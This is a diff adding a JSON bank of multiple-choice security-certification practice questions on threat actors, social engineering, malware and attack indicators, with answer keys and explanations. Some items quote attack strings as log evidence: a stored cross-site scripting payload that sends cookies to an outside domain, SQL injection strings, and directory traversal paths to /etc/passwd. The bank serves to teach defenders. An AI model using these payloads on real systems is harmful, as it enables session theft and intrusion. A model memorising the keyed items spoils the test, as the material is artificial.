@@ -1,0 +1,831 @@
+[
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Threat actors",
+    "difficulty": 1,
+    "format": "single",
+    "stem": "Investigators find that an adversary kept stealthy access to a defense contractor's network for three years using custom malware and previously unknown exploits. Which threat actor is MOST likely responsible?",
+    "options": [
+      "Unskilled attacker",
+      "Hacktivist group",
+      "Nation-state",
+      "Organized crime"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Years of covert access, custom tooling and zero-day exploits point to an advanced persistent threat with the funding and sophistication of a nation-state pursuing espionage. Organized crime is financially motivated and usually monetizes access quickly rather than hiding for years."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Patch management",
+    "difficulty": 1,
+    "format": "single",
+    "stem": "A vendor published a security advisory and CVE for a remote code execution flaw in the company's VPN appliance, and fixed firmware is available. Which mitigation is MOST appropriate?",
+    "options": [
+      "Isolate the appliance permanently",
+      "Apply the vendor patch",
+      "Add an application allow list",
+      "Monitor logs for exploitation"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "A published, documented vulnerability with an available fix is best mitigated by patching the firmware promptly. Monitoring only detects exploitation after the fact and leaves the flaw open."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Threat actors",
+    "difficulty": 1,
+    "format": "single",
+    "stem": "A city agency's public website is defaced with slogans protesting a new zoning law, and the responsible group posts a manifesto online. Which threat actor BEST fits this activity?",
+    "options": [
+      "Hacktivist",
+      "Organized crime",
+      "Nation-state",
+      "Unskilled attacker"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Hacktivists are driven by philosophical or political beliefs and seek publicity, which matches a protest defacement with a manifesto. Organized crime is motivated by financial gain and rarely advertises a cause."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Actor motivations",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "Two days after receiving a termination notice, a database administrator deletes production tables using still-active credentials. Which motivation BEST describes this insider's action?",
+    "options": [
+      "Revenge",
+      "Espionage",
+      "Financial gain",
+      "Philosophical beliefs"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Destroying data right after being fired is a classic revenge motive for an internal threat actor. Espionage would involve quietly copying data for a competitor or government rather than destroying it."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Shadow IT",
+    "difficulty": 1,
+    "format": "single",
+    "stem": "A marketing team signs up for an unapproved file-sharing service with a corporate card and stores customer lists there without IT's knowledge. This is an example of:",
+    "options": [
+      "A malicious insider threat",
+      "Shadow IT",
+      "Organized crime",
+      "A supply chain vendor attack"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Shadow IT is technology adopted by employees outside the organization's approval and control, usually for convenience rather than harm. A malicious insider intends damage, which nothing in this scenario suggests."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Removable media",
+    "difficulty": 2,
+    "format": "multi",
+    "select": 2,
+    "stem": "Several USB drives labeled Payroll Q4 were found in the parking lot, and an employee plugged one into a workstation that then beaconed to an external IP. Which TWO controls would BEST reduce the risk of this attack succeeding again? (Choose two.)",
+    "options": [
+      "Block USB storage with device control",
+      "Train staff to turn in found media",
+      "Encrypt every laptop's internal hard drive",
+      "Require longer domain passwords",
+      "Enable WPA3 on the office Wi-Fi"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "Device control stops unknown USB storage from mounting, and awareness training stops people from plugging in found drives. Full-disk encryption protects data on a lost laptop but does nothing against malware delivered by removable media."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Default credentials",
+    "difficulty": 1,
+    "format": "single",
+    "stem": "A botnet scan logs successful logins to dozens of company IP cameras using the username admin and the password admin. Which hardening step would have BEST prevented this?",
+    "options": [
+      "Changing default passwords",
+      "Installing endpoint protection",
+      "Enabling full-disk encryption",
+      "Deploying a host-based firewall"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "The cameras were accessed with factory default credentials, so changing default passwords removes the attack vector directly. Encryption protects stored data but does nothing to stop a valid login."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Supply chain attacks",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "Attackers compromised a managed service provider's remote monitoring tool and used it to push ransomware to every client the provider supports. Which attack surface was exploited?",
+    "options": [
+      "Unsecure wired network access",
+      "Unsupported legacy applications",
+      "Supply chain via an MSP",
+      "Default credentials on endpoints"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Managed service providers have trusted access into many customers, so compromising the provider is a supply chain attack against all of them. Default credentials were not needed because the attackers rode the MSP's legitimate access."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Social engineering",
+    "difficulty": 2,
+    "format": "matrix",
+    "stem": "For each message an employee received, select the social engineering technique it represents.",
+    "rows": [
+      "Text urging a tap to fix delivery",
+      "Voicemail demanding a callback about taxes",
+      "Bulk email with a fake password reset",
+      "Email to the CEO about a fake lawsuit",
+      "Call from a fake bank fraud team"
+    ],
+    "columns": [
+      "Phishing",
+      "Smishing",
+      "Vishing",
+      "Whaling"
+    ],
+    "correct": [
+      1,
+      2,
+      0,
+      3,
+      2
+    ],
+    "explanation": "Smishing uses SMS, vishing uses voice calls and voicemail, broad email lures are phishing, and a lure aimed at a senior executive is whaling. The CEO email is the tempting phishing pick, but targeting an executive specifically makes it whaling."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Social engineering",
+    "difficulty": 1,
+    "format": "single",
+    "stem": "A caller claiming to be from the bank's fraud department asks a user to read back the one-time passcode that was just sent to her phone. Which attack is occurring?",
+    "options": [
+      "Smishing",
+      "Vishing",
+      "Business email compromise",
+      "Watering hole"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Vishing is voice phishing, where the attacker uses a phone call and a convincing pretext to extract information. The passcode arrived by text, but the attack itself is the voice call, so it is not smishing."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Business email compromise",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "Accounts payable receives a message from the genuine mailbox of a supplier's finance manager asking that future invoices be paid to a new bank account. Which attack is MOST likely?",
+    "options": [
+      "Typosquatting",
+      "Business email compromise",
+      "Brand impersonation",
+      "Disinformation campaign"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Business email compromise uses a real, taken-over business mailbox to request fraudulent payments or account changes. Brand impersonation fakes a company's identity from outside, but this message came from the legitimate account."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Watering hole attacks",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "Engineers at several aerospace firms were infected after visiting a niche industry forum that attackers had injected with an exploit kit. Which technique did the attackers use?",
+    "options": [
+      "Watering hole",
+      "Typosquatting",
+      "Spear phishing",
+      "Pretexting"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A watering hole attack compromises a site the target group already trusts and visits. Spear phishing would send a crafted message to the victims rather than waiting at a shared site."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Typosquatting",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "Proxy logs show users browsing to micros0ft-support.com and entering credentials on a page that mimics the vendor's login portal. Which technique BEST explains how users reached the site?",
+    "options": [
+      "DNS cache poisoning",
+      "Watering hole",
+      "Typosquatting",
+      "On-path attack"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Typosquatting registers look-alike domains, such as a zero in place of the letter o, to catch mistyped or careless clicks. DNS poisoning would send users to a bad IP while they still saw the real domain name."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Unsecure networks",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "Sales staff routinely connect to open hotel Wi-Fi, and a packet capture shows plaintext internal application traffic. Which mitigation BEST protects this data in transit?",
+    "options": [
+      "Disabling Bluetooth radios",
+      "An application allow list",
+      "Host-based intrusion prevention",
+      "Always-on VPN encryption"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Unsecure wireless networks expose traffic to sniffing, and encrypting it through an always-on VPN protects the data in transit. A host-based IPS blocks malicious activity on the laptop but does not hide plaintext traffic from eavesdroppers."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Buffer overflow",
+    "difficulty": 3,
+    "format": "single",
+    "stem": "An IDS alert shows a request to a legacy service containing 2,000 repeated 0x90 bytes followed by shellcode. Which attack is MOST likely being attempted?",
+    "options": [
+      "Buffer overflow",
+      "SQL injection",
+      "Directory traversal",
+      "Cross-site scripting"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A long run of 0x90 NOP bytes followed by shellcode is a NOP sled used to overflow a buffer and inject code into memory. SQL injection would contain database syntax such as quotes and OR clauses."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Race conditions",
+    "difficulty": 3,
+    "format": "single",
+    "stem": "A program checks that a user may write to a temporary file, but an attacker swaps the file for a symbolic link to /etc/shadow before the write occurs. Which vulnerability is this?",
+    "options": [
+      "Memory injection into a process",
+      "Race condition (TOC/TOU)",
+      "Directory traversal",
+      "Virtual machine resource reuse"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "The gap between the time of check and the time of use lets the attacker change the resource after it was validated, which is a race condition. Directory traversal manipulates paths in input, not timing."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "SQL injection",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "A web server log contains the request /login?user=admin'--&pass=x followed by a successful administrator session. Which attack does this entry indicate?",
+    "options": [
+      "SQL injection",
+      "Cross-site scripting",
+      "Credential replay",
+      "Buffer overflow"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "The quote and double dash close the query string and comment out the password check, a classic SQL injection. Credential replay would reuse captured valid credentials rather than inject query syntax."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Cross-site scripting",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "Forum visitors report that viewing one post sends their session cookies to an unknown domain; the post contains <script>fetch('//x.io/?c='+document.cookie)</script>. Which vulnerability was exploited?",
+    "options": [
+      "SQL injection",
+      "Stored cross-site scripting",
+      "Cross-site request forgery",
+      "Directory traversal"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Script saved in a post and executed in other users' browsers is stored cross-site scripting. Request forgery makes the victim's browser submit an unwanted action, not run attacker script to steal cookies."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "VM escape",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "A tenant on a shared hypervisor exploits a flaw in the virtual graphics driver and gains code execution on the host, reaching other tenants' guests. Which vulnerability is this?",
+    "options": [
+      "Resource reuse",
+      "VM escape",
+      "Jailbreaking",
+      "Cloud misconfiguration"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Breaking out of a guest to the hypervisor and other guests is a virtual machine escape. Resource reuse exposes leftover data in reallocated memory or storage rather than giving code execution on the host."
+  },
+  {
+    "domain": "secThreats",
+    "test": 1,
+    "skill": "Threat actor attributes",
+    "difficulty": 2,
+    "format": "multi",
+    "select": 2,
+    "stem": "Investigators attribute a multi-year intrusion with custom malware to a nation-state actor. Which TWO attributes typically distinguish this type of threat actor? (Choose two.)",
+    "options": [
+      "Extensive resources and funding",
+      "High technical sophistication",
+      "Seeks public attention for a cause",
+      "Relies on publicly available tools",
+      "Usually works inside the target"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "Nation-state actors are well funded and highly sophisticated, which is why they can develop custom exploits and persist for years. Seeking attention for a cause describes a hacktivist, not a state-sponsored group."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Malicious updates",
+    "difficulty": 3,
+    "format": "single",
+    "stem": "A vendor's digitally signed software update was found to contain a backdoor inserted at its build server, affecting thousands of customers. Which vulnerability type BEST describes this?",
+    "options": [
+      "Operating system zero-day",
+      "Hardware provider tampering",
+      "Side loading",
+      "Malicious update"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A trusted, signed update that carries attacker code is a malicious update delivered through a software provider in the supply chain. Hardware provider tampering involves physical components, not a software build."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Mobile device risks",
+    "difficulty": 1,
+    "format": "multi",
+    "select": 2,
+    "stem": "A company's mobile security policy aims to keep malicious apps off employee phones. Which TWO practices bypass the phone's built-in app vetting and should be prohibited? (Choose two.)",
+    "options": [
+      "Side loading apps from websites",
+      "Jailbreaking or rooting the device",
+      "Enabling automatic OS updates",
+      "Using fingerprint unlock",
+      "Installing apps from the official store"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "Side loading installs apps that never passed store review, and jailbreaking or rooting removes the operating system restrictions that enforce app vetting. Automatic updates reduce risk rather than add it."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Zero-day mitigation",
+    "difficulty": 3,
+    "format": "single",
+    "stem": "Threat intelligence reports active exploitation of a newly discovered browser flaw for which the vendor has not released a patch. Which control BEST reduces risk until a fix is available?",
+    "options": [
+      "Applying the vendor patch now",
+      "Host-based IPS",
+      "Full-disk encryption",
+      "Changing default credentials"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "With a zero-day there is no patch, so a host-based intrusion prevention system that detects and blocks exploit behavior is the best interim control. Applying a patch is not possible because none exists yet."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Configuration enforcement",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "Developers repeatedly create cloud storage buckets with public read access, exposing customer files. Which mitigation BEST prevents these misconfigurations from persisting?",
+    "options": [
+      "Application allow listing",
+      "Host-based firewalls",
+      "Configuration enforcement",
+      "Decommissioning old buckets"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Configuration enforcement automatically checks and corrects settings against a secure baseline, catching public buckets as they appear. Decommissioning old buckets does nothing about new ones being misconfigured."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Malware types",
+    "difficulty": 1,
+    "format": "single",
+    "stem": "Malware spreading over SMB port 445 infected 300 hosts in an hour without any user opening a file or clicking a link. Which type of malware is MOST likely?",
+    "options": [
+      "Virus",
+      "Worm",
+      "Logic bomb",
+      "Trojan"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "A worm self-replicates across the network by exploiting services, with no user action needed. A virus needs a user to run an infected host file to spread."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Ransomware response",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "An analyst sees a laptop rapidly renaming shared-drive files with a .lock extension and dropping README_RESTORE.txt notes. Which action should the analyst take FIRST?",
+    "options": [
+      "Isolate the laptop from the network",
+      "Patch the laptop's operating system",
+      "Restore the files from backup",
+      "Change the user's password"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Mass file renaming and ransom notes indicate ransomware, and isolating the host first stops further encryption of shared data. Restoring backups before containment lets the malware encrypt the restored files again."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Logic bombs",
+    "difficulty": 1,
+    "format": "single",
+    "stem": "After a developer was laid off, a payroll script he wrote deleted all employee records on the first day the HR database no longer listed his ID. Which malware type is this?",
+    "options": [
+      "Worm",
+      "Rootkit",
+      "Spyware",
+      "Logic bomb"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A logic bomb is code that lies dormant until a condition is met, here the developer's removal from the database. It does not self-propagate like a worm."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Rootkits",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "A server's antivirus reports clean, yet a memory forensic image reveals a hidden process and a modified kernel system-call table concealing attacker files. Which malware is MOST likely present?",
+    "options": [
+      "Rootkit",
+      "Bloatware",
+      "Keylogger",
+      "Logic bomb"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A rootkit hooks the kernel to hide processes and files from the operating system and antivirus. A keylogger records keystrokes but does not by itself alter the system-call table."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Least privilege",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "Malware a user launched from a phishing attachment installed a system driver because the user's everyday account had local administrator rights. Which mitigation would BEST have prevented this?",
+    "options": [
+      "Full-disk encryption",
+      "Network segmentation",
+      "Host-based firewall",
+      "Least privilege"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Running daily work with a standard account under least privilege would have blocked the driver installation. A host-based firewall filters traffic but does not stop a locally launched program from using admin rights."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Application allow listing",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "Users keep installing a free PDF converter that secretly installs a remote access tool alongside it. Which mitigation BEST prevents unapproved executables like this from running?",
+    "options": [
+      "Application allow list",
+      "Host-based firewall rules",
+      "Full-disk encryption",
+      "Network segmentation"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "The converter is a trojan, and an application allow list lets only approved programs execute, so it never runs. Host-based firewall rules might block some callbacks but would not stop the program from installing."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "System hardening",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "New laptops from a vendor arrive with trial games, toolbars, and an outdated vendor update agent that has a known vulnerability. Which hardening technique BEST addresses this?",
+    "options": [
+      "Deploying host-based intrusion prevention",
+      "Changing default passwords",
+      "Enabling disk encryption",
+      "Removing unnecessary software"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Preinstalled bloatware adds attack surface, and removing unnecessary software eliminates the vulnerable agent entirely. A host IPS may detect exploitation but leaves the vulnerable code installed."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "RFID cloning",
+    "difficulty": 3,
+    "format": "single",
+    "stem": "A badge reader logs an employee's ID at the data center door while that employee was at home. Days earlier, a stranger lingered close beside her in a cafe line. Which attack is MOST likely?",
+    "options": [
+      "Tailgating",
+      "Brute force of the door lock",
+      "Environmental attack",
+      "RFID cloning"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Standing close to a victim with a concealed reader can copy a proximity badge, which is RFID cloning. Tailgating would show someone following an authorized person in, not the absent employee's badge being used."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "DDoS amplification",
+    "difficulty": 3,
+    "format": "single",
+    "stem": "A web server is flooded with large DNS ANY responses arriving from thousands of open resolvers, although the server never sent any DNS queries. Which attack is this?",
+    "options": [
+      "DNS cache poisoning",
+      "Domain hijacking",
+      "Amplified DDoS",
+      "Credential replay"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Attackers spoof the victim's address in small queries so open resolvers reflect much larger responses to it, an amplified and reflected DDoS. DNS poisoning corrupts resolver records rather than flooding a target."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "DNS poisoning",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "Users typing the correct bank URL are sent to a fake site, and the local resolver's cache maps the bank's domain to an unfamiliar IP address. Which attack has occurred?",
+    "options": [
+      "Typosquatting",
+      "Watering hole attack",
+      "DNS cache poisoning",
+      "Brand impersonation campaign"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Corrupted resolver cache entries that send a correctly typed domain to an attacker's IP are DNS poisoning. Typosquatting relies on users typing a look-alike domain, which did not happen here."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "On-path attacks",
+    "difficulty": 3,
+    "format": "single",
+    "stem": "A network monitor shows the default gateway's IP address suddenly mapped to a user workstation's MAC address, and that workstation is forwarding all subnet traffic. Which attack is underway?",
+    "options": [
+      "Wireless deauthentication",
+      "Credential replay",
+      "On-path attack",
+      "DNS amplification"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "ARP poisoning that makes a workstation impersonate the gateway places it on the path between hosts and the router. Deauthentication attacks knock wireless clients offline rather than relaying their traffic."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Pass-the-hash",
+    "difficulty": 3,
+    "format": "single",
+    "stem": "Domain controller logs show NTLM logons to many servers using an administrator's hash captured from a compromised workstation, without the password ever being typed. Which attack is this?",
+    "options": [
+      "Password spraying",
+      "Birthday collision attack",
+      "Pass-the-hash",
+      "Offline brute force attack"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Pass-the-hash is credential replay that reuses a captured NTLM hash to authenticate without knowing the password. Offline brute force would try to crack the hash, which was unnecessary here."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Attack indicators",
+    "difficulty": 3,
+    "format": "matrix",
+    "stem": "A WAF and the identity provider recorded the following entries. For each entry, select the attack it MOST likely indicates.",
+    "rows": [
+      "GET /view?file=../../../etc/passwd",
+      "user=admin' OR '1'='1 in a login form",
+      "One account, 4,000 failed passwords",
+      "600 accounts, one failed login each",
+      "GET /img?path=..%2f..%2fwin.ini"
+    ],
+    "columns": [
+      "SQL injection",
+      "Directory traversal",
+      "Password spraying",
+      "Brute force"
+    ],
+    "correct": [
+      1,
+      0,
+      3,
+      2,
+      1
+    ],
+    "explanation": "Dot-dot-slash sequences, plain or URL encoded as %2f, are directory traversal; a quote followed by OR '1'='1 is SQL injection. Many attempts against one account is brute force, while one common password tried across many accounts is spraying, which is easy to confuse with brute force."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Cross-site request forgery",
+    "difficulty": 3,
+    "format": "single",
+    "stem": "While logged in to the company banking portal, a user opens a malicious page that silently submits a funds-transfer form using the user's active session. Which attack is this?",
+    "options": [
+      "Cross-site scripting",
+      "Privilege escalation",
+      "Server-side request forgery",
+      "Cross-site request forgery"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Cross-site request forgery abuses the victim's authenticated session so the browser submits an unwanted request. Server-side request forgery tricks the server, not the user's browser, into making requests."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Downgrade attacks",
+    "difficulty": 3,
+    "format": "single",
+    "stem": "A packet capture shows a client and server that both support TLS 1.2 negotiating SSL 3.0 after an intermediary stripped stronger cipher suites from the handshake. Which attack occurred?",
+    "options": [
+      "Birthday attack",
+      "Downgrade attack",
+      "Hash collision attack",
+      "Replay attack"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Forcing two capable parties onto a weaker, vulnerable protocol is a downgrade attack. A replay attack resends captured valid traffic rather than altering the handshake."
+  },
+  {
+    "domain": "secThreats",
+    "test": 2,
+    "skill": "Birthday attacks",
+    "difficulty": 3,
+    "format": "single",
+    "stem": "Which cryptographic attack exploits the high probability that two different inputs produce the same hash output, especially against short digests such as MD5?",
+    "options": [
+      "Downgrade attack",
+      "Replay attack",
+      "Password spraying",
+      "Birthday attack"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "The birthday attack uses the birthday paradox to find hash collisions far faster than brute force, so short digests are most at risk. A downgrade attack weakens protocol negotiation and does not target hash collisions."
+  },
+  {
+    "domain": "secThreats",
+    "test": 0,
+    "skill": "Password spraying",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "Authentication logs show one failed login for each of 900 accounts within ten minutes, all from one IP and all trying Winter2026!, with no lockouts. Which attack is this?",
+    "options": [
+      "Brute force attack",
+      "Credential replay attack",
+      "Birthday attack",
+      "Password spraying"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Password spraying tries one common password across many accounts to stay under lockout thresholds. Brute force hammers a single account with many passwords and usually triggers account lockout."
+  },
+  {
+    "domain": "secThreats",
+    "test": 0,
+    "skill": "Indicators of compromise",
+    "difficulty": 2,
+    "format": "multi",
+    "select": 2,
+    "stem": "A SIEM shows these events for one user's account during a single morning. Which TWO are indicators that the account may be compromised? (Choose two.)",
+    "options": [
+      "Chicago and Singapore logins 18 minutes apart",
+      "Active sessions from two countries at once",
+      "Login from the office at 8:55 a.m.",
+      "Password reset after an expiry notice",
+      "VPN login from her usual home internet provider"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "Logins too far apart to travel between are impossible travel, and simultaneous sessions from different countries are concurrent session usage; both are classic indicators. A password reset following an expiry notice is expected behavior."
+  },
+  {
+    "domain": "secThreats",
+    "test": 0,
+    "skill": "Log indicators",
+    "difficulty": 2,
+    "format": "single",
+    "stem": "During an investigation, the analyst finds the web server's security log has no entries between 01:00 and 03:30, although the server was online and serving traffic. Which indicator is this?",
+    "options": [
+      "Out-of-cycle logging",
+      "Blocked content",
+      "Account lockout",
+      "Missing logs"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A gap in logs while the system was active suggests an attacker cleared or stopped logging to hide activity. Out-of-cycle logging means entries appearing at unusual times, not entries that are absent."
+  },
+  {
+    "domain": "secThreats",
+    "test": 0,
+    "skill": "Legacy system mitigation",
+    "difficulty": 2,
+    "format": "multi",
+    "select": 2,
+    "stem": "A plant runs an end-of-life controller on an operating system that can no longer be patched or run security agents, but it must still exchange data with one HMI. Which TWO mitigations are MOST appropriate? (Choose two.)",
+    "options": [
+      "Isolate it on a restricted segment",
+      "Monitor its traffic for anomalies",
+      "Install a modern EDR agent",
+      "Allow vendor access from the internet",
+      "Join it to the corporate domain"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "Segmentation limits who can reach the controller to the one HMI, and traffic monitoring compensates for the missing host protections. An EDR agent is not an option because the stem says the system cannot run security agents."
+  }
+]
